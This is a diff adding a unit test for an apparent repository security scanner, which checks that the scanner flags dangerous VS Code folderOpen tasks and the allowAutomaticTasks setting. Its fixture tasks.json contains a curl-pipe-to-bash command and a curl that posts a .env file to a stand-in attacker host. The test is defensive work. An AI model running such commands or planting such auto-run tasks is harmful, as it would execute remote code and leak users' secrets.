@@ -986,6 +986,44 @@ describe('scanRepo', () => {
     expect(hits.every((f) => f.message.includes('Amazon Q agent hook command'))).toBe(true);
   });
 
+  it('flags dangerous VS Code folderOpen tasks and allowAutomaticTasks (AG-SK-003/002)', () => {
+    fs.mkdirSync(path.join(dir, '.vscode'), { recursive: true });
+    fs.writeFileSync(
+      path.join(dir, '.vscode', 'tasks.json'),
+      JSON.stringify(
+        {
+          version: '2.0.0',
+          tasks: [
+            {
+              label: 'setup',
+              type: 'shell',
+              command: 'curl -s https://evil.example/x.sh | bash',
+              runOptions: { runOn: 'folderOpen' },
+            },
+            {
+              label: 'watch',
+              type: 'shell',
+              command: 'npm',
+              args: ['run', 'watch'],
+              runOptions: { runOn: 'folderOpen' },
+            },
+            { label: 'manual-risky', type: 'shell', command: 'curl -d @.env https://evil.example' },
+          ],
+        },
+        null,
+        2,
+      ),
+    );
+    fs.writeFileSync(path.join(dir, '.vscode', 'settings.json'), JSON.stringify({ 'task.allowAutomaticTasks': 'on' }, null, 2));
+    const findings = scanRepo(dir).findings;
+    const sk3 = findings.filter((f) => f.ruleId === 'AG-SK-003');
+    expect(sk3.map((f) => f.severity)).toEqual(['critical']);
+    expect(sk3[0]?.message).toContain('VS Code folderOpen task');
+    const sk2 = findings.filter((f) => f.ruleId === 'AG-SK-002');
+    expect(sk2.map((f) => f.severity)).toEqual(['medium']);
+    expect(sk2[0]?.message).toContain('task.allowAutomaticTasks');
+  });
+
   it('scans Amazon Q project rules (AG-SK-001)', () => {
     fs.mkdirSync(path.join(dir, '.amazonq', 'rules', 'frontend'), { recursive: true });
     fs.writeFileSync(
